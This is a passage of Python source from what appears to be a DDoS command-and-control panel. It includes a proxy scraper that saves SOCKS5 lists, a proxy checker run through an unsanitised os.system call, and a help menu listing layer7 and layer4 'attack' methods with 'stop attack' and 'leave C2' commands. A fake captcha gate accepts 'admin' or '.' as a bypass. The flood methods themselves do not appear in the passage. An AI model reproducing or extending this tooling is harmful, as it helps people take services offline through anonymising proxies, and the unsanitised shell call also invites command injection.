        elif ".pr/socks5" in cnc:     
            try:       
                print(Color.LG+"proxy getting please wait...")
                with open("proxies/socks5.txt", 'w') as p:  
                       p.write(httpx.get(http_proxy3).text) 
                       p.write(httpx.get(http_proxy4).text)  
                       p.write(httpx.get(http_proxy4x).text)
                print(Color.LG+"Done, proxy save as proxies/socks5.txt")
            except:
                print(f'Error')      
                                 
        elif ".check" in cnc:     
            try:
                file1 = cnc.split()[1]
                type = cnc.split()[2]
                file2 = cnc.split()[3]
                timeout = cnc.split()[4]
                print(Color.LG+"Maybe take long time, please wait")
                os.system(f'node Tools/proxychecker.js {file1} {type} {file2} {timeout}  ')
                print(Color.LG+f"Done, save as "+file2+". ")
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".check file(in) type file(out) timeout(100/150 it good) ")
                print(Color.LC+f".check http.txt http httpx.txt 100")

        
        elif ".3xit" in cnc:
            try:
                quit()
            except KeyboardInterrupt:
               print('Quit cow')

        elif ".help" in cnc:
            print(Color.LC+" .layer7      "+Color.LY+"layer7 methods")
            print(Color.LC+" .layer4      "+Color.LY+"layer4 methods")
            print(Color.LC+" .tools       "+Color.LY+"tools")
            print(Color.LC+" .ports       "+Color.LY+"ports")       
            print(Color.LC+" .stop        "+Color.LY+"stop attack")
            print(Color.LC+" .{method}    "+Color.LY+"attack")
            print(Color.LC+" .clear       "+Color.LY+"clear")
            print(Color.LC+" Ctrl + C     "+Color.LY+"cancel process")
            print(Color.LC+" .3xit        "+Color.LY+"leave C2")
    
        
        else:
            try:
                notf = cnc.split()[0]
                print(Color.LG+"Not Found "+Color.LR+f"["+notf+"]"+Color.LG+" Command")
                print(Color.LG+".help "+Color.LC+"to show the commands")
            except:
                pass
        
def capcha():
    a1 = "You are "
    b1 = "human.\n"
    c1 = "robot.\n"
    admin = "admin"
    admin1 = "."
    word1 = ("a", "b", "c", "d", "e", "f", "g", "k", "o", "p", "x", "m", "n", "v", "z", "l", "j", "s", "y", "t", "r", "w", "q", "u", "A", "B", "C", "D", "E", "F", "G", "K", "O", "P", "X", "M", "N", "V", "Z", "L", "J", "S", "Y", "T", "R", "W", "Q", "U", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19")
    
    word2 = ("a", "b", "c", "d", "e", "f", "g", "k", "o", "p", "x", "m", "n", "v", "z", "l", "j", "s", "y", "t", "r", "w", "q", "u", "A", "B", "C", "D", "E", "F", "G", "K", "O", "P", "X", "M", "N", "V", "Z", "L", "J", "S", "Y", "T", "R", "W", "Q", "U", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19")
    
    num1 = ("a", "b", "c", "d", "e", "f", "g", "k", "o", "p", "x", "m", "n", "v", "z", "l", "j", "s", "y", "t", "r", "w", "q", "u", "A", "B", "C", "D", "E", "F", "G", "K", "O", "P", "X", "M", "N", "V", "Z", "L", "J", "S", "Y", "T", "R", "W", "Q", "U", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19")
    
    num2 = ("a", "b", "c", "d", "e", "f", "g", "k", "o", "p", "x", "m", "n", "v", "z", "l", "j", "s", "y", "t", "r", "w", "q", "u", "A", "B", "C", "D", "E", "F", "G", "K", "O", "P", "X", "M", "N", "V", "Z", "L", "J", "S", "Y", "T", "R", "W", "Q", "U", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19")
    
    clear()

    w1 = random.choice(word1)
    
    w2 = random.choice(word2)
    
    n1 = random.choice(num1) 
    
    n2 = random.choice(num2)

    b = w1+n1+w2+n2
    print(Color.LR+"Verify you are human "+Color.LM+"["+Color.RESET, b ,Color.LM+"]")
    capcha = input(Color.LR+f'Capcha: '+Color.RESET)
    if capcha == b or capcha == admin or capcha == admin1:
    
      for a in a1:
        print(Color.LY+a, end='')
        sys.stdout.flush()
        sleep(0.1)
        
      for b in b1:
        print(Color.LW+b, end='')
        sys.stdout.flush()
        sleep(0.3)
        
      clear()
      pgrs()
      clear()
      wc()
      main()
      
    else:
    
      for a in a1:
        print(Color.LY+a, end='')
        sys.stdout.flush()
        sleep(0.1)
      for c in c1:
      
        print(Color.LR+c, end='')
        sys.stdout.flush()
        sleep(0.3)
        
      quit()
      
capcha()


#Made by NhatAnh/VN/Project1.0/DontAbuse/